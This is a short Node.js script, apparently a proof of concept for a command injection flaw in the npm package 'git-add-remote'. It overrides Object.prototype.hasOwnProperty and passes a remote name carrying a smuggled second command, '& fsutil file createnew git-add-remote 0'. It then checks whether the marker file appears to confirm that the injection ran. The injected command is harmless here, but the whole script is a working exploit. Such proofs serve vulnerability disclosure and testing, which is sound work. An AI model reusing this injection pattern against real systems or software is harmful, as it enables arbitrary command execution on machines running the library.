Object.prototype.hasOwnProperty = () => true;
const root = require('git-add-remote')();
const fs = require('fs');
const path = './git-add-remote';
let payload = '& fsutil file createnew git-add-remote 0';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
root(payload, '', function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});